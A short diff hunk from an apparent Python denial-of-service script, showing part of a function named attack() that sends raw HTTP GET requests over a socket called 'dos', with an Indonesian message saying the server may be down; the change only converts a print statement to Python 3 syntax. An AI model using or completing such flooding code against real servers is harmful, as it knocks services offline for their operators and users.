@@ -128,7 +128,7 @@ def attack():
         
         dos.send("GET /%s HTTP/1.1\nHOST: %s\n\n" % (url_path, host))
     except socket.error, e:
-        print "\n [Tidak Ada Koneksi Atau Server Kemungkinan DOWN]: " + str(e)
+        print ("\n [Tidak Ada Koneksi Atau Server Kemungkinan DOWN]: " + str(e))
     finally:
         dos.shutdown(socket.SHUT_RDWR)
         dos.close()
